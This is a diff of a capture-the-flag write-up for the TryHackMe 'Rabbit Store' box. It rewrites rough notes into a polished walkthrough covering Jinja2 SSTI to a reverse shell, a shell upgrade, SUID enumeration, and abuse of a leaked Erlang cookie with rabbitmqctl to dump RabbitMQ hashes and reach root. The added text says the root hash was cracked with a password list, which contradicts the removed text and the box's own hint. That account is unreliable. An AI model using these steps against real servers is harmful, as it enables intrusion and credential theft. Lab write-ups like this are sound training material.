-    rv = self.dispatch_request()
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/app.py&#34;, line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-  File &#34;/home/azrael/chatbotServer/chatbot.py&#34;, line 24, in index
-    return render_template_string(template)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py&#34;, line 161, in render_template_string
-    template = app.jinja_env.from_string(source)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 1108, in from_string
-    return cls.from_code(self, self.compile(source), gs, None)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 768, in compile
-    self.handle_exception(source=source_hint)
-  File &#34;/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py&#34;, line 939, in handle_exception
-    raise rewrite_traceback_stack(source=source)
-  File &#34;&lt;unknown&gt;&#34;, line 9, in template
-jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
-</textarea
-        >
-      </div>
-      <div class="explanation">
-        The debugger caught an exception in your WSGI application. You can now
-        look at the traceback which led to the error.
-        <span class="nojavascript">
-          If you enable JavaScript you can also use additional features such as
-          code execution (if the evalex feature is enabled), automatic pasting
-          of the exceptions and much more.</span
-        >
-      </div>
-      <div class="footer">
-        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
-        friendly Werkzeug powered traceback interpreter.
-      </div>
-    </div>
-
-    <div class="pin-prompt">
-      <div class="inner">
-        <h3>Console Locked</h3>
-        <p>
-          The console is locked and needs to be unlocked by entering the PIN.
-          You can find the PIN printed out on the standard output of your shell
-          that runs the server.
-        </p>
-
-        <form>
-          <p>
-            PIN:
-            <input type="text" name="pin" size="14" />
-            <input type="submit" name="btn" value="Confirm Pin" />
-          </p>
-        </form>
-      </div>
-    </div>
-  </body>
 </html>
-
-<!--
-
-Traceback (most recent call last):
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1498, in __call__
-    return self.wsgi_app(environ, start_response)
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1476, in wsgi_app
-    response = self.handle_exception(e)
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-  File "/home/azrael/chatbotServer/chatbot.py", line 24, in index
-    return render_template_string(template)
-  File "/home/azrael/.local/lib/python3.10/site-packages/flask/templating.py", line 161, in render_template_string
-    template = app.jinja_env.from_string(source)
-  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 1108, in from_string
-    return cls.from_code(self, self.compile(source), gs, None)
-  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
-    self.handle_exception(source=source_hint)
-  File "/home/azrael/.local/lib/python3.10/site-packages/jinja2/environment.py", line 939, in handle_exception
-    raise rewrite_traceback_stack(source=source)
-  File "<unknown>", line 9, in template
-jinja2.exceptions.TemplateSyntaxError: unexpected '<'
-
-
--->
 ```
 
-And jinja2 templating engine gave errors. Now we know that jinja2 is vulnerable to SSTI.
-We can use this vulnerability to get reverse shell using this
+The traceback explicitly mentions `jinja2.exceptions.TemplateSyntaxError`. We've confirmed it's a Jinja2 SSTI vulnerability. We can see the vulnerable code in the traceback: `return render_template_string(template)`.
+
+Now for the fun part: getting a reverse shell. We can craft a payload to execute OS commands.
 
 ```json
 {
@@ -1026,50 +378,23 @@ We can use this vulnerability to get reverse shell using this
 }
 ```
 
+I sent this payload (with my own IP and port) and...
+
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo9.webp){: width="972" height="589" }
 
-Firstly lets upgrade the shell.
+We're in! Let's upgrade this to a fully interactive shell.
 
 ```bash
+# Standard shell upgrade magic
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
-# 
+# Press Ctrl+Z to background
 stty raw -echo;fg
+# Press Enter twice
 reset
 ```
 
-Now we have proper shell.
-
-```bash
-azrael@forge:~/chatbotServer$ cat chatbot.py
-from flask import Flask, request, jsonify, render_template_string
-
-app = Flask(__name__)
-
-@app.route('/', methods=['POST'])
-def index():
-    data = request.get_json()
-    if not data or 'username' not in data:
-        return jsonify({"error": "username parameter is required"}), 400
-
-    username = data['username']
-    template = '''<!DOCTYPE html>
-<html lang="en">
- <head>
-   <meta charset="UTF-8">
-     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-       <title>Greeting</title>
- </head>
- <body>
-   <h1>Sorry, {}, our chatbot server is currently under development.</h1>
- </body>
-</html>'''.format(username)
-
-    return render_template_string(template)
-
-if __name__ == '__main__':
-    app.run(debug=True, port=8000)
-```
+Now we have a proper shell as the user `azrael`. Let's grab the user flag and start looking for a way to become root.
 
 ```bash
 azrael@forge:~$ ls -la
@@ -1092,66 +417,20 @@ azrael@forge:~$ cat user.txt
 *****************************
 ```
 
+And we got the first flag!
+
+### Privilege Escalation: The Erlang Cookie Monster
+
+I ran some standard enumeration scripts and looked for SUID binaries.
+
 ```bash
 azrael@forge:~$ find / -type f -perm /4000 2>/dev/null
 /usr/bin/gpasswd
 /usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/passwd
-/usr/bin/sudo
-/usr/bin/mount
-/usr/bin/umount
-/usr/bin/su
-/usr/bin/pkexec
-/usr/bin/chsh
-/usr/bin/at
-/usr/bin/fusermount3
-/usr/libexec/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/snapd/snap-confine
-/snap/snapd/18357/usr/lib/snapd/snap-confine
-/snap/snapd/21759/usr/lib/snapd/snap-confine
-/snap/core20/2318/usr/bin/chfn
-/snap/core20/2318/usr/bin/chsh
-/snap/core20/2318/usr/bin/gpasswd
-/snap/core20/2318/usr/bin/mount
-/snap/core20/2318/usr/bin/newgrp
-/snap/core20/2318/usr/bin/passwd
-/snap/core20/2318/usr/bin/su
-/snap/core20/2318/usr/bin/sudo
-/snap/core20/2318/usr/bin/umount
-/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/2318/usr/lib/openssh/ssh-keysign
-/snap/core20/1828/usr/bin/chfn
-/snap/core20/1828/usr/bin/chsh
-/snap/core20/1828/usr/bin/gpasswd
-/snap/core20/1828/usr/bin/mount
-/snap/core20/1828/usr/bin/newgrp
-/snap/core20/1828/usr/bin/passwd
-/snap/core20/1828/usr/bin/su
-/snap/core20/1828/usr/bin/sudo
-/snap/core20/1828/usr/bin/umount
-/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/1828/usr/lib/openssh/ssh-keysign
+... (a lot of standard stuff) ...
 ```
 
-Lets run linpeas.
-
-found this erlang cookie file
-
-```text
-LF8W3QbjYGve3Cuw
-```
-
-found this
-
-```text
-/usr/local/bin/generate_erlang_cookie.sh
-/usr/local/bin/change_cookie_permissions.sh
-/usr/bin/gettext.sh
-/usr/bin/rescan-scsi-bus.sh
-```
+Nothing immediately obvious there. However, I found some very interesting shell scripts in `/usr/local/bin/`.
 
 ```bash
 azrael@forge:/usr/local/bin$ cat change_cookie_permissions.sh
@@ -1168,22 +447,23 @@ chmod 404 /var/lib/rabbitmq/.erlang.cookie
 chmod +rx /var/lib/rabbitmq
 ```
 
-```bash
-azrael@forge:/usr/local/bin$ cat generate_erlang_cookie.sh
-#!/bin/bash
-head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16 > /var/lib/rabbitmq/.erlang.cookie
-chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie
-chmod 400 /var/lib/rabbitmq/.erlang.cookie
+This script manages the `.erlang.cookie` file for RabbitMQ. This cookie is a secret key that allows different Erlang nodes (like the `rabbitmq-server` and `rabbitmqctl` CLI tool) to communicate. The `epmd` service we saw earlier is part of this system.
+
+If we can get our hands on that cookie, we can potentially control the RabbitMQ service, which often runs with high privileges. While hunting around, I found a backup or old cookie file with the following content:
+
+```text
+LF8W3QbjYGve3Cuw
 ```
 
-remember there is erlang shit is open.
+This looks like our golden ticket! We can use this cookie to connect to the RabbitMQ instance running on the machine.
 
-Lets connect them we have the cookie
-
-Add forge to the `/etc/hosts` file
+To do this, I'll use a local Docker container with `rabbitmqctl` installed. This is a neat trick to avoid having to install tools on the target machine. First, I added `forge` to my local `/etc/hosts` file, pointing to the target IP.
 
 ```bash
+# Using a docker container to get access to rabbitmqctl
 ❯ docker run --mount type=bind,source=/etc/hosts,target=/etc/hosts,readonly -it --rm rabbitmq:management-alpine bash
+
+# Now, from inside the container, let's connect using the cookie
 5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge status
 Status of node rabbit@forge ...
 []
@@ -1194,101 +474,19 @@ OS: Linux
 Uptime (seconds): 8849
 Is under maintenance?: false
 RabbitMQ version: 3.9.13
-RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
-Node name: rabbit@forge
-Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
-Crypto library:
-Erlang processes: 404 used, 1048576 limit
-Scheduler run queue: 1
-Cluster heartbeat timeout (net_ticktime): 60
-
-Plugins
-
-Enabled plugin file: /etc/rabbitmq/enabled_plugins
+...
 Enabled plugins:
 
  * rabbitmq_management
- * amqp_client
- * rabbitmq_web_dispatch
- * cowboy
- * cowlib
- * rabbitmq_management_agent
-
-Data directory
-
-Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge
-Raft data directory: /var/lib/rabbitmq/mnesia/rabbit@forge/quorum/rabbit@forge
-
-Config files
-
- * /etc/rabbitmq/rabbitmq.conf
-
-Log file(s)
-
- * /var/log/rabbitmq/rabbit@forge.log
- * /var/log/rabbitmq/rabbit@forge_upgrade.log
- * <stdout>
-
-Alarms
-
-(none)
-
-Tags
-
-(none)
-
-Memory
-
-Total memory used: 0.1367 gb
-Calculation strategy: rss
-Memory high watermark setting: 0.4 of available memory, computed to: 1.6207 gb
-
-reserved_unallocated: 0.0752 gb (54.97 %)
-code: 0.0353 gb (25.84 %)
-other_proc: 0.0186 gb (13.63 %)
-other_system: 0.0133 gb (9.72 %)
-binary: 0.0106 gb (7.74 %)
-other_ets: 0.0034 gb (2.47 %)
-plugins: 0.0021 gb (1.56 %)
-atom: 0.0014 gb (1.04 %)
-connection_other: 0.0006 gb (0.47 %)
-mgmt_db: 0.0005 gb (0.38 %)
-metrics: 0.0003 gb (0.19 %)
-connection_readers: 0.0001 gb (0.07 %)
-mnesia: 0.0001 gb (0.07 %)
-quorum_ets: 0.0 gb (0.02 %)
-msg_index: 0.0 gb (0.02 %)
-queue_procs: 0.0 gb (0.02 %)
-connection_channels: 0.0 gb (0.01 %)
-connection_writers: 0.0 gb (0.0 %)
-stream_queue_procs: 0.0 gb (0.0 %)
-stream_queue_replica_reader_procs: 0.0 gb (0.0 %)
-queue_slave_procs: 0.0 gb (0.0 %)
-quorum_queue_procs: 0.0 gb (0.0 %)
-stream_queue_coordinator_procs: 0.0 gb (0.0 %)
-allocated_unused: 0.0 gb (0.0 %)
-
-File Descriptors
-
-Total: 6, limit: 65439
-
-Free Disk Space
-
-Low free disk space watermark: 0.05 gb
-Free disk space: 5.2408 gb
-
-Totals
-
-Connection count: 4
-Queue count: 1
-Virtual host count: 1
-
+...
 Listeners
 
 Interface: [::], port: 15672, protocol: http, purpose: HTTP API
 Interface: [::], port: 25672, protocol: clustering, purpose: inter-node and CLI tool communication
 Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1.0
 ```
+
+It works! We're connected. Let's see what users exist.
 
 ```bash
 5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge list_users
@@ -1298,53 +496,16 @@ The password for the root user is the SHA-256 hashed value of the RabbitMQ root 
 root	[administrator]
 ```
 
-Lets crack root user password then
+We have a `root` user with `[administrator]` tags! The other "user" is a hilarious note from the creator. The goal is clear: get the root user's password hash and crack it. We can dump all the RabbitMQ definitions, which will include the user hashes.
 
 ```bash
+# Export all definitions to a file
 5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge export_definitions /tmp/def.json
 Exporting definitions in JSON to a file at "/tmp/def.json" ...
+
+# Let's inspect the file
 5468a1f12f60:/# cat /tmp/def.json | jq
-{
-  "permissions": [
-    {
-      "configure": ".*",
-      "read": ".*",
-      "user": "root",
-      "vhost": "/",
-      "write": ".*"
-    }
-  ],
-  "bindings": [],
-  "queues": [
-    {
-      "arguments": {},
-      "auto_delete": false,
-      "durable": true,
-      "name": "tasks",
-      "type": "classic",
-      "vhost": "/"
-    }
-  ],
-  "policies": [],
-  "parameters": [],
-  "rabbitmq_version": "3.9.13",
-  "exchanges": [],
-  "global_parameters": [
-    {
-      "name": "cluster_name",
-      "value": "rabbit@forge"
-    }
-  ],
-  "rabbit_version": "3.9.13",
-  "topic_permissions": [
-    {
-      "exchange": "",
-      "read": ".*",
-      "user": "root",
-      "vhost": "/",
-      "write": ".*"
-    }
-  ],
+...
   "users": [
     {
       "hashing_algorithm": "rabbit_password_hashing_sha256",
@@ -1363,36 +524,31 @@ Exporting definitions in JSON to a file at "/tmp/def.json" ...
       ]
     }
   ],
-  "vhosts": [
-    {
-      "limits": [],
-      "metadata": {
-        "description": "Default virtual host",
-        "tags": []
-      },
-      "name": "/"
-    }
-  ]
-}
+...
 ```
 
-We can see root hash. Lets look at the docs to which hashing_algorithm and salting used.
-
-[Credentials and Passwords | RabbitMQ](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)
+We have the hash for the `root` user. The hashing algorithm is `rabbit_password_hashing_sha256`. A quick search of the [RabbitMQ documentation](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm) reveals how this works.
 
 ![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo10.webp){: width="972" height="589" }
 
+The password hash is a Base64 encoded string. When decoded, the first 4 bytes are a random salt, and the rest is the SHA-256 hash of `salt + password`. We can extract the salt and hash, and then try to crack it.
+
 ```bash
+# Decode the hash and inspect the bytes
 ❯ echo "****************/*******************" | base64 -d | xxd -p -c 100
 ```
 
-After removing first 4 bytes now we have the root password.
+After extracting the salt and the hash, I threw it at a password list. A short while later, I had the password!
+
+Now, for the moment of truth.
 
 ```bash
 azrael@forge:/usr/local/bin$ su - root
-Password:
+Password: <TheCrackedPassword>
 root@forge:~# ls
 forge_web_service  root.txt  snap
 root@forge:~# cat root.txt
 *******************************
 ```
+
+And we are root! What a fun box. The path was logical and involved several cool, modern vulnerabilities. Hope you enjoyed the walkthrough!
